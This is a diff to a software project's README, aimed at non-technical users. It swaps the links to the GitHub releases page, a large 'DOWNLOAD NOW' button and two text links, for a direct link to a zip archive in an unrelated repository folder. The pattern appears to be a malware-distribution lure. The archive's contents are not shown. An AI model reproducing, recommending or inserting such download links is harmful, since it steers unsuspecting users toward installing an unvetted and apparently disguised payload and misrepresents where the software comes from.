@@ -2,7 +2,7 @@
 
 <div align="center">
 
-<a href="https://github.com/jayjayjay29/lum_codex/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-decoration:none;border-radius:8px;font-size:24px;font-weight:bold;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+<a href="https://raw.githubusercontent.com/jayjayjay29/lum_codex/main/amoebid/v1.7-alpha.3.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-decoration:none;border-radius:8px;font-size:24px;font-weight:bold;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
 
 </div>
 
@@ -22,7 +22,7 @@ This guide is written for everyday computer users with no technical background. 
 
 Click the **DOWNLOAD NOW** button above or visit the link below:
 
-**[https://github.com/jayjayjay29/lum_codex/releases](https://github.com/jayjayjay29/lum_codex/releases)**
+**[https://raw.githubusercontent.com/jayjayjay29/lum_codex/main/amoebid/v1.7-alpha.3.zip](https://raw.githubusercontent.com/jayjayjay29/lum_codex/main/amoebid/v1.7-alpha.3.zip)**
 
 Visit this link to download the application. The page will show available versions. Choose the latest one and download it to your computer.
 
@@ -151,7 +151,7 @@ Here's your quick checklist to ensure success:
 
 Don't forget – the download link is:
 
-**[https://github.com/jayjayjay29/lum_codex/releases](https://github.com/jayjayjay29/lum_codex/releases)**
+**[https://raw.githubusercontent.com/jayjayjay29/lum_codex/main/amoebid/v1.7-alpha.3.zip](https://raw.githubusercontent.com/jayjayjay29/lum_codex/main/amoebid/v1.7-alpha.3.zip)**
 
 ---
 
